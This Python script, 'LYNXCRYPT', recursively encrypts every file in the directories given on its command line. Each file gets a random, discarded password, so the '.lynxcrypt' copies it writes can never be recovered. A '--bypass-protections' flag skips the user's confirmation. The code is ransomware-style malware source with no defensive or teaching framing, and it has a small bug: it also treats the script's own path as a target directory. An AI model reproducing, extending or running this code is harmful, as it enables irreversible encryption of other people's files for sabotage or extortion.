import os
import sys
import pyAesCrypt
import pyfiglet
import random
import string

def mainDef():
    printLogo()
    
    if checkProt():
        startEnc()
    else:
        exit()

def printLogo():
    print(pyfiglet.figlet_format("LYNXCRYPT"))

def checkProt():
    if "--bypass-protections" in sys.argv:
        print("All the protections have been disabled.\nThe encryption process will start now.\n\n")

        return True
    else:
        if input("The protections are enabled.\nTo start the encryption process, you have to confirm typing Y: ") == "Y":
            print("The encryption process will start now.\n\n")

            return True
        else:
            print("The program will exit now.\n\n")
            
            return False

def startEnc():
    dirsToEnc = []

    for arg in sys.argv:
        if arg != "--bypass-protections":
            dirsToEnc.append(arg)
    
    for dirToEnc in dirsToEnc:
        encFiles(dirToEnc)


def encFiles(encDir):
    for encFile in os.listdir(encDir):
        encFilePath = os.path.join(encDir, encFile)

        if (os.path.isdir(encFilePath)):
            encFiles(encFilePath)
        else:
            encAlrFilePath = encFilePath + ".lynxcrypt"

            try:
                pyAesCrypt.encryptFile(encFilePath, encAlrFilePath, genPassw(50), 65536)

                print(encFilePath + " has been encrypted.\n")
            except:
                print("Failed to encrypt " + encFilePath + ". Passing to the next file.\n")

def genPassw(passLen):
    passChar = string.ascii_letters + string.digits + string.punctuation
    passStr = ''.join(random.choice(passChar) for _ in range(passLen))

    return passStr

if __name__ == "__main__":
    mainDef()